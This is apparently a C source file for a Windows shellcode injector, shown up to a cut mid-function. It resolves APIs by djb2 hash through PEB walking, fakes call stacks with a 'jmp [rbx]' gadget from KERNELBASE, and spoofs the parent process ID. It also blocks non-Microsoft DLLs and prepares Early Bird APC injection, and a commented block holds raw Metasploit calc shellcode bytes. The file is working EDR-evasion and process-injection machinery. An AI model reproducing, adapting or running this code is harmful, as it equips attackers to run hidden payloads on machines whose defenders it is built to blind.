#include <Windows.h>
#include <stdio.h>
#include <stdlib.h> // For strtol
//#include <processthreadsapi.h>
#include "Structs.h"
#include "Macros.h"
#include "shellcode.h"

#include <ntstatus.h>

extern PVOID NTAPI Spoof(PVOID a, ...);

void pattern()
{
    printf("\n===========================================================================\n");
}

DWORD64 djb2(const char* str)
{
	// djb2 algo:

	DWORD64 dwHash = 0x7734773477347734;
	int c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;


	return dwHash;
}

char* PWSTR_to_Char(const wchar_t* wideStr)
{
    int size = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);

    char* buffer = (char*)malloc(size);
    if (buffer == NULL) {
        wprintf(L"Memory allocation failed.\n");
        return NULL;
    }

    WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, buffer, size, NULL, NULL);

    return buffer;
}

LPVOID ResolveNtAPI(HMODULE DllBase, DWORD64 passedHash)
{
	//printf("\t[+] BaseDll addr: %p\n", DllBase);

	// region Start: DOS_HEADER
	IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)DllBase;
	// endregion End: DOS_HEADER

	// region Start: NT_HEADERS => Accessing the last member of DOS Header (e_lfanew) to get the entry point for NT Header
	IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((LPBYTE)DllBase + DOS_HEADER->e_lfanew);
	// endregion Start: NT_HEADERS

	// Getting the Size of ntdll
	//SIZE_T ntdllsize = NT_HEADER->OptionalHeader.SizeOfImage;

	// Loading loaded DllBase Address from: 
	// 
	// Method2:
	// 
	// Optional Header (IMAGE_OPTIONAL_HEADER64 struture) -> present in winnt.h file

	/*
	typedef struct _IMAGE_OPTIONAL_HEADER64 {
		...
		...
		...
		DWORD AddressOfEntryPoint;
		...
		...
		...
		ULONGLONG ImageBase;
		...
		...
		...
		IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
	} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
	*/
	//IMAGE_OPTIONAL_HEADER64* ImageBase = (IMAGE_OPTIONAL_HEADER64*)(NT_HEADER->OptionalHeader.ImageBase + NT_HEADER->OptionalHeader.AddressOfEntryPoint);
	//printf("[+] BaseDllName: %ws (addr: %p)\n", BaseDllName, ImageBase);

	//IMAGE_DATA_DIRECTORY* DataDirectory = (IMAGE_DATA_DIRECTORY*)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES].VirtualAddress);

	//DWORD*	AddressOfFunctions = (DWORD*)((LPBYTE)DllBase + DataDirectory->)
	//DWORD*	AddressOfNames = 
	//DWORD*	AddressOfNameOrdinals = 

	PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)DllBase + NT_HEADER->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD fAddr = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfFunctions);
	PDWORD fNames = (PDWORD)((LPBYTE)DllBase + EXdir->AddressOfNames);
	PWORD  fOrdinals = (PWORD)((LPBYTE)DllBase + EXdir->AddressOfNameOrdinals);
	
	//printf("\tfAddr: %p\n", fAddr);
	//printf("\tfNames: %p\n", fNames);
	//printf("\tfOrdinals: %p\n", fOrdinals);

	// Looping:
	for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++)
	{
		LPSTR pFuncName = (LPSTR)((LPBYTE)DllBase + fNames[i]);
		
		//PWSTR pwFuncName = LPSTR_to_PWSTR(pFuncName);
		
		//DWORD64 hash = create_hash(pwFuncName);
		DWORD64 hash = djb2(pFuncName);

		if (hash == passedHash)
		{
			printf("Hash NtApi: %s matched and calculated as: 0x%llX : 0x%llX\t\n", pFuncName, hash, passedHash);

			//printf("[+] FuncName: %s\n", pFuncName);
			return (LPVOID)((LPBYTE)DllBase + fAddr[fOrdinals[i]]);
		}
		//printf("[+] FuncName: %s\n", pFuncName);
	}
	return 0;
}

HMODULE ResolveDLL(DWORD64 passedHash)
{
	// Init some important stuff
	PNT_TIB pTIB = NULL;
	PTEB pTEB = NULL;
	PPEB pPEB = NULL;

	// ==========================  Directly via offset (from TIB) -> TEB -> PEB ==============================================

	// Get pointer to the TEB
	// __readgsqword :
	// It is MSVC compiler intrinsic that reads memory from GS segment at specified offset.

	
	// Method1:


	// Refer: https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
	//
	// In link, Refer Table: Contents of the TIB on Windows: 7th Row
	pTIB = (PNT_TIB)__readgsqword(0x30);
	pTEB = (PTEB)pTIB->Self;

	// Refer: https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
	//
	// In link, Refer Table: Contents of the TIB on Windows: 9th Row
	//DWORD PID = (DWORD)__readgsqword(0x40);
	//printf("\n[+] PID from TEB: %ld\n", PID);

	// Get pointer to the PEB
	pPEB = (PPEB)pTEB->ProcessEnvironmentBlock;
	if (pPEB == NULL)
	{
		printf("\n[!] Unable to get ptr to PEB (%u)\n", GetLastError());
		return NULL;
	}
	else
	{
		//printf("\n[+] Got pPEB: Directly via offset (from TIB) -> TEB -> PEB: %X\n", pPEB);
		printf("\n[+] Got pPEB: Directly via offset (from TIB) -> TEB -> PEB\n\n");
	}

	// ========================== End: Directly via offset (from TIB) ==============================================
	/*
	printf("\t\tOR\n");

	// ========================== Directly via offset (from TIB) -> PEB ==============================================

	
	// Method2:


	// Refer: https://en.wikipedia.org/wiki/Win32_Thread_Information_Block
	//
	// In link, Refer Table: Contents of the TIB on Windows: 7th Row
	PPEB pPEB2 = (PPEB)__readgsqword(0x60);
	if (pPEB2 == NULL)
	{
		printf("Unable to get ptr to PEB\n");
		return 1;
	}
	else
	{
		printf("\n[+] Got pPEB: Directly via offset (from TIB) -> PEB\n");
	}

	// ========================== End: Directly via offset (from TIB) -> PEB ==============================================
	*/

	// Storing pointer to PEB_LDR_DATA:
	PPEB_LDR_DATA pPEB_LDR_DATA = (PPEB_LDR_DATA)(pPEB->Ldr);

	PLIST_ENTRY ListHead, ListEntry;
	PLDR_DATA_TABLE_ENTRY LdrEntry;

	// Code Taken From: https://doxygen.reactos.org/d7/d55/ldrapi_8c_source.html#l01124
	ListHead = &pPEB->Ldr->InLoadOrderModuleList;
	ListEntry = ListHead->Flink;
	int c = 0;
	while (ListHead != ListEntry)
	{
		/* Get the entry */
		LdrEntry = CONTAINING_RECORD(ListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		// Loading loaded DllBase Address from:
		// 
		// Method1:
		// 
		// Loader Data Table Entry (LDR_DATA_TABLE_ENTRY struture) -> present in ntapi.h file

		//UNICODE_STRING FullDllName = (UNICODE_STRING)(LdrEntry->FullDllName);
		//UNICODE_STRING BaseDllName = (UNICODE_STRING)(LdrEntry->BaseDllName);
        UNICODE_STRING BaseDllName = LdrEntry->BaseDllName;
		//PVOID DllBase = (PVOID)(LdrEntry->DllBase);
		HMODULE DllBase = (HMODULE)(LdrEntry->DllBase);

		// Thanks to @D1rkMtr
		/*
		typedef struct _UNICODE_STRING {
			USHORT Length;
			USHORT MaximumLength;
			PWSTR  Buffer;
		} UNICODE_STRING, *PUNICODE_STRING;
		*/

		//printf("FullDllName: %ws\n", FullDllName.Buffer);
		//printf("BaseDllName: %ws (addr: %p)\n", BaseDllName.Buffer, DllBase);

		/*
		// Everytime ntdll.dll will be 2nd to load

		if (c == 1)
		{
			return DllBase;
		}
		c++;
		*/

		// ================================== Checking Passed API hash ==================================
		//DWORD64 retrievedhash = create_hash(BaseDllName.Buffer);

		// djb2 hash:
		const char* Dllname = PWSTR_to_Char(BaseDllName.Buffer);
		DWORD64 retrievedhash = djb2(Dllname);

		//printf("retrievedhash: 0x%llX\n", retrievedhash);
		//printf("BaseDllName: %ws (addr: %p)\n\n", BaseDllName.Buffer, DllBase);
		
		if (retrievedhash == passedHash)
		{
            //if (strcmp(Dllname,"KERNELBASE.dll") == 0)
            //{
            //    printf("Retrieving JOP gadget from a dll\n");
            //    return DllBase;
            //}
			printf("Hashed dll : %ws matched and calculated as: 0x%llX : 0x%llX\n", BaseDllName.Buffer, retrievedhash, passedHash);
			//printf("BaseDllName: %ws (addr: %p)\n\n", BaseDllName.Buffer, DllBase);
			return DllBase;
		}

		// ================================== End: Checking Passed API hash ==================================

		/* Advance to the next module */
		ListEntry = ListEntry->Flink;
	}

	return 0;
}

PVOID FindGadget(LPBYTE Module, ULONG Size)
{
    for (int x = 0; x < Size; x++)
    {
        // jmp [rbx] gadget = "\xFF\x23"
        if (memcmp(Module + x, "\xFF\x23", 2) == 0)
        {
            return (PVOID)(Module + x);
        };
    };

    return NULL;
}

/* Credit to VulcanRaven project for the original implementation */
ULONG CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 ImageBase)
{
    NTSTATUS status = STATUS_SUCCESS;
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    StackFrame stackFrame = { 0 };


    // [0] Sanity check incoming pointer.
    if (!pRuntimeFunction)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Loop over unwind info.
    // NB As this is a PoC, it does not handle every unwind operation, but
    // rather the minimum set required to successfully mimic the default
    // call stacks included.
    pUnwindInfo = (PUNWIND_INFO)(ImageBase + pRuntimeFunction->UnwindData);
    while (index < pUnwindInfo->CountOfCodes)
    {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        // [2] Loop over unwind codes and calculate
        // total stack space used by target Function.
        switch (unwindOperation)
        {
            case UWOP_PUSH_NONVOL:
                // UWOP_PUSH_NONVOL is 8 bytes.
                stackFrame.totalStackSize += 8;
                // Record if it pushes rbp as
                // this is important for UWOP_SET_FPREG.
                if (RBP_OP_INFO == operationInfo)
                {
                    stackFrame.pushRbp = true;
                    // Record when rbp is pushed to stack.
                    stackFrame.countOfCodes = pUnwindInfo->CountOfCodes;
                    stackFrame.pushRbpIndex = index + 1;
                }
                break;
            case UWOP_SAVE_NONVOL:
                //UWOP_SAVE_NONVOL doesn't contribute to stack size
                // but you do need to increment index.
                index += 1;
                break;
            case UWOP_ALLOC_SMALL:
                //Alloc size is op info field * 8 + 8.
                stackFrame.totalStackSize += ((operationInfo * 8) + 8);
                break;
            case UWOP_ALLOC_LARGE:
                // Alloc large is either:
                // 1) If op info == 0 then size of alloc / 8
                // is in the next slot (i.e. index += 1).
                // 2) If op info == 1 then size is in next
                // two slots.
                index += 1;
                frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
                if (operationInfo == 0)
                {
                    frameOffset *= 8;
                }
                else
                {
                    index += 1;
                    frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
                }
                stackFrame.totalStackSize += frameOffset;
                break;
            case UWOP_SET_FPREG:
                // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
                // that rbp is the expected value (in the frame above) when
                // it comes to spoof this frame in order to ensure the
                // call stack is correctly unwound.
                stackFrame.setsFramePointer = true;
                break;
            default:
                printf("[-] Error: Unsupported Unwind Op Code\n");
                status = STATUS_ASSERTION_FAILURE;
                break;
        }

        index += 1;
    }

    // If chained unwind information is present then we need to
    // also recursively parse this and add to total stack size.
    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO))
    {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1))
        {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        //return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
        return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);
    }

    // Add the size of the return address (8 bytes).
    stackFrame.totalStackSize += 8;

    return stackFrame.totalStackSize;
Cleanup:
    return status;
}

/* Credit to VulcanRaven project for the original implementation */
ULONG CalculateFunctionStackSizeWrapper(PVOID ReturnAddress)
{
    NTSTATUS status = STATUS_SUCCESS;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    // [0] Sanity check return address.
    if (!ReturnAddress)
    {
        status = STATUS_INVALID_PARAMETER;
        goto Cleanup;
    }

    // [1] Locate RUNTIME_FUNCTION for given Function.
    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)ReturnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction)
    {
        status = STATUS_ASSERTION_FAILURE;
        printf("[!] STATUS_ASSERTION_FAILURE\n");
        goto Cleanup;
    }

    // [2] Recursively calculate the total stack size for
    // the Function we are "returning" to.
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);

Cleanup:
    return status;
}

// Credits to: @peterwintrsmith
// and @0xBoku (https://github.com/boku7/BokuLoader/blob/main/src/BokuLoader.c#L848)

ULONG FindTextSection(HMODULE module)
{
    PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) module;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) module + pImgDOSHead->e_lfanew);

    // find .text section
	for (int i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++)
    {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, ".text"))
        {
            //printf("pImgSectionHead->VirtualAddress (Absolute): %X\n", module+pImgSectionHead->VirtualAddress);
            printf("\n\npImgSectionHead->Misc.VirtualSize: %llx\n", pImgSectionHead->Misc.VirtualSize);
            return pImgSectionHead->Misc.VirtualSize;
        }
    }
}

BOOL Local_blockdlls()
{
	// Define the policy
	PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY Policy = { 0 };
	Policy.MicrosoftSignedOnly = 1;

	// Enable blocking of non-Microsoft signed DLLs
	BOOL result = SetProcessMitigationPolicy(ProcessSignaturePolicy, &Policy, sizeof(Policy));
	
	if (!result)
	{
		printf("Failed to set policy (%u)\n", GetLastError());
		return FALSE;
	}
	
	return TRUE;
}

/*
// ==================================== NtCreateUserProcess Func ==================================== :

BOOL NtCreateUserProcessForthree(
    IN      PWSTR   szTargetProcess,
    IN      PWSTR   szTargetProcessParameters,
    IN      PWSTR   szTargetProcessPath,
    IN      HANDLE  hParentProcess,
    OUT     PHANDLE hProcess,
    OUT     PHANDLE hThread
)
{
    pattern();

    NTSTATUS                        STATUS = NULL;
    //NTSTATUS STATUS = STATUS_SUCCESS;
    UNICODE_STRING                  UsNtImagePath = { 0 },
    UsCommandLine = { 0 },
    UsCurrentDirectory = { 0 };
    PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters = NULL;
    
    // the mitigation policy flag (attribute value): CIG + ACG
    DWORD64  Policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON + PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
    
    // allocating a buffer to hold the value of the attribute lists
    PPS_ATTRIBUTE_LIST              pAttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    if (!pAttributeList)
        return FALSE;

    printf("[+] HERE: 494\n");

    // initializing the 'UNICODE_STRING' structures with the inputted paths
    _RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
    _RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
    _RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

    printf("[+] HERE: 501\n");

    fnNtCreateUserProcess NtCreateUserProcess = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtCreateUserProcess");
    fnRtlCreateProcessParametersEx RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleW(L"NTDLL"), "RtlCreateProcessParametersEx");

    printf("[+] HERE: 510\n");

    // calling 'RtlCreateProcessParametersEx' to intialize a 'PRTL_USER_PROCESS_PARAMETERS' structure for 'NtCreateUserProcess'
    //PVOID spoofResult2 = Spoof(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, 

    STATUS = RtlCreateProcessParametersEx(&UppProcessParameters, &UsNtImagePath, NULL, &UsCurrentDirectory, &UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
    
    printf("[+] HERE: 517\n");

    if (STATUS != STATUS_SUCCESS)
    {
        printf("[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n", STATUS);
        goto CleanUp;
    }

    printf("[+] HERE: 512\n");

    // setting the length of the attribute list
    pAttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    // intializing an attribute list of type 'PS_ATTRIBUTE_IMAGE_NAME' that specifies the image's path
    pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    pAttributeList->Attributes[0].Size = UsNtImagePath.Length;
    pAttributeList->Attributes[0].Value = (ULONG_PTR)UsNtImagePath.Buffer;

    // intializing an attribute list of type 'PS_ATTRIBUTE_MITIGATION_OPTIONS' that specifies the use of process's mitigation policies
    pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS;
    pAttributeList->Attributes[1].Size = sizeof(DWORD64);
    pAttributeList->Attributes[1].Value = (ULONG_PTR)&Policy;

    // intializing an attribute list of type 'PS_ATTRIBUTE_PARENT_PROCESS' that specifies the process's parent
    pAttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    pAttributeList->Attributes[2].Size = sizeof(HANDLE);
    pAttributeList->Attributes[2].Value = (ULONG_PTR)hParentProcess;

    printf("[+] HERE: 534\n");

    // creating the 'PS_CREATE_INFO' structure, that will almost always look like this
    PS_CREATE_INFO psCreateInfo;
    psCreateInfo.Size = sizeof(PS_CREATE_INFO);
    psCreateInfo.State = PsCreateInitialState;

    printf("[+] HERE: 541\n");

    PRM p = { 0 };

    // Resolve ntdll.dll: 0x4FD1CD7BBE06FCFC
    //HMODULE hDLL_ntdll = ResolveDLL(0x4FD1CD7BBE06FCFC);

    // Resolve NtCreateUserProcess API address: 0xCC5074955D34EB28
	//PVOID pNtCreateUserProcess = ResolveNtAPI(hDLL_ntdll, 0xCC5074955D34EB28);

    //p.ssn = (PVOID)0xc9;

    // creating the process
    // hProcess and hThread are already pointers
    
    //PVOID spoofResult2 = Spoof(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, &p, pNtCreateUserProcess, (PVOID)7, (PVOID)NULL, (PVOID)NULL, (PVOID)NULL, (PVOID)NULL, (PVOID)UppProcessParameters, (PVOID)&psCreateInfo, (PVOID)pAttributeList);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    
    //STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &psCreateInfo, pAttributeList);
    //STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_SUSPENDED, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, UppProcessParameters, &psCreateInfo, pAttributeList);

    STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, 1, UppProcessParameters, &psCreateInfo, pAttributeList);    
    
    if (STATUS != STATUS_SUCCESS)
    {
        printf("[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n", STATUS);
        goto CleanUp;
    }
    

    printf("[+] HERE: 563\n");

    /*
    // Check the returned value
    if (spoofResult2 == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtCreateUserProcess\n");
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult, GetLastError());
        // Perform additional error handling as needed
        goto CleanUp;
    }
    */
/*
CleanUp:
    HeapFree(GetProcessHeap(), 0, pAttributeList);
    if (*hProcess == NULL || *hThread == NULL)
        return FALSE;
    else
        return TRUE;
}
*/

// ==================================== END: NtCreateUserProcess Func ==================================== :

int main(int argc, char** argv)
{
    if (argc < 2)
	{
		printf("[!] Wrong!\n");
		printf("[->] Syntax: .\\%s <PPID to spoof>\n\n", argv[0]);
		return 1;
	}

	// PPID to Spoof
	char* point;
	int ppid = strtol(argv[1], &point, 10);

    printf("[+] PPID: %d", ppid);
    //int ppid = 7856;

    // Block Dlls On Local Process:
    BOOL status1 = Local_blockdlls();

    if (status1 == TRUE)
    {
        printf("\n[+] CIG/ Blocked non MS signed DLLs on Local Process\n");
    }

    printf("\n"); getchar();

    PVOID ReturnAddress = NULL;
    PRM p = { 0 };
    //PRM ogp = { 0 };
    NTSTATUS status = STATUS_SUCCESS;

    /* Preparing Initial (1st) Legit looking Fake Custom Thread Stack Frame (2nd Top of the Stack) */
    // BTIT_ss = BaseThreadInitThunk Stack Size

    printf("\n[1.] Preparing Initial (1st) Legit looking Fake Custom Thread Stack Frame (2nd Top of the Stack)\n");

    // Resolve KERNEL32.DLL: 0xE14F02AA4725B604
    HMODULE hDLL_kernel32 = ResolveDLL(0xE14F02AA4725B604);

    // Resolve BaseThreadInitThunk API address: 0xC3F9878F960B3C45
	LPVOID pBaseThreadInitThunk = ResolveNtAPI(hDLL_kernel32, 0xC3F9878F960B3C45);

    //ReturnAddress = (PBYTE)(GetProcAddress(LoadLibraryA("kernel32.dll"), "BaseThreadInitThunk")) + 0x14;
    ReturnAddress = (PBYTE)(pBaseThreadInitThunk) + 0x14;
    p.BTIT_ss = (PVOID)CalculateFunctionStackSizeWrapper(ReturnAddress);
    p.BTIT_retaddr = ReturnAddress;

    /* Preparing Initial (2nd) Legit looking Fake Custom Thread Stack Frame (Top of the Stack) */
    // RUTS_ss = RtlUserThreadStart Stack Size

    printf("\n[2.] Preparing Initial (2nd) Legit looking Fake Custom Thread Stack Frame (Top of the Stack)\n");

    // Resolve ntdll.dll: 0x4FD1CD7BBE06FCFC
    HMODULE hDLL_ntdll = ResolveDLL(0x4FD1CD7BBE06FCFC);

    // Resolve RtlUserThreadStart API address: 0x885E1095EA13D32B
	LPVOID pRtlUserThreadStart = ResolveNtAPI(hDLL_ntdll, 0x885E1095EA13D32B);

    //ReturnAddress = (PBYTE)(GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlUserThreadStart")) + 0x21;
    ReturnAddress = (PBYTE)(pRtlUserThreadStart) + 0x21;
    p.RUTS_ss = (PVOID)CalculateFunctionStackSizeWrapper(ReturnAddress);
    p.RUTS_retaddr = ReturnAddress;

    /* Preparing Initial (3rd) Fake Custom Thread Stack Frame from where JOP gadget ("jmp [rbx]") is originating */

    //HMODULE module = GetModuleHandleA("kernel32.dll"); // ntdll.dll
    //HMODULE module = LoadLibraryA("KernelBase.dll");

    printf("\n[3.] Preparing Initial (3rd) Fake Custom Thread Stack Frame from where JOP gadget is originating\n");

    // Resolve KERNELBASE.dll: 0x711A56F25841485A
    HMODULE hDLL_kernelbase = ResolveDLL(0x711A56F25841485A);

    ULONG size = FindTextSection(hDLL_kernelbase );

    p.trampoline = FindGadget((LPBYTE)hDLL_kernelbase, size);
    printf("\n[+] JOP Gadget (\"jmp [rbx]\") is at 0x%llx\n", p.trampoline);

    p.Gadget_ss = (PVOID)CalculateFunctionStackSizeWrapper(p.trampoline);

    // =========================== Naked Msf Calc Shellcode: ========================================

    /////////////////////////////////////// For shellcode usage: Shellcode Obuscation with LLVM ///////////////////////////////////////

    PVOID BaseAddress = NULL;
    /*
    // Define the shellcode to be injected
    unsigned char enc_shellcode_bin[] = "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B\x6F\x87\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x63\x61\x6C\x63\x00";
   // unsigned char enc_shellcode_bin[] = "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";
    
    unsigned int shellcode_size = sizeof(enc_shellcode_bin);

    // SIZE_T shellcode variable for NT api operation
    SIZE_T shellcode_size2 = sizeof(enc_shellcode_bin);
    ULONG shcSize = (ULONG)shellcode_size;
    */
    // =========================== Naked Msf Calc Shellcode: ========================================

    unsigned int shellcode_size = sizeof(enc_shellcode_bin);

	// SIZE_T shellcode variable for NT api operation
	SIZE_T shellcode_size2 = sizeof(enc_shellcode_bin);
	ULONG shcSize = (ULONG)shellcode_size;

    // =========================== Naked Msf Calc Shellcode: ========================================
	
    /* Target Spawned Remote Sacrificial Process: Early Bird APC PInjection : Thanks to reenz0h(twitter : @SEKTOR7net) */

	// Intializing some important stuff
	PROCESS_INFORMATION pi;
    STARTUPINFOEXA si;
    SIZE_T attributeSize = 0;

    // Required for a STARTUPINFOEXA
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    // ================ NtOpenProcess() =============================

    pattern();

    // Resolve NtOpenProcess API address: 0x718CCA1F5291F6E7
	PVOID pNtOpenProc = ResolveNtAPI(hDLL_ntdll, 0x718CCA1F5291F6E7);

    // Initializing OBJECT_ATTRIBUTES and CLIENT_ID struct
	OBJECT_ATTRIBUTES pObjectAttributes;
	InitializeObjectAttributes(&pObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID pClientId;
	pClientId.UniqueProcess = (PVOID)ppid;
	pClientId.UniqueThread = (PVOID)0;

    HANDLE hParentProc = NULL;

    p.ssn = (PVOID)0x26;

    // Opening a handle to the parent process to enable PPID spoofing
    PVOID spoofResult = Spoof(&hParentProc, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId, &p, pNtOpenProc, (PVOID)0);
    // Spoof(param1, param2, param3, param4, &SpoofStruct, AddrOfFunc, NumofStackArgs, argN)
    // NtOpenProcess(&hParentProc, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);

    // Check the returned value
    if (spoofResult == 0)
    {
        // Successfully obtained a valid result
        // Do something with spoofResult
        printf("[+] spoof() returned a valid result => Called NtOpenProcess\n");
        printf("[+] Parent Process Handle: 0x%X (Check with ProcessHacker->Handle Tab)\n", hParentProc);
    }
    else
    {
        // Handle the case where spoof() returned nullptr
        printf("[!] spoof() failed with error code: 0x%llx (%u)\n", spoofResult, GetLastError());
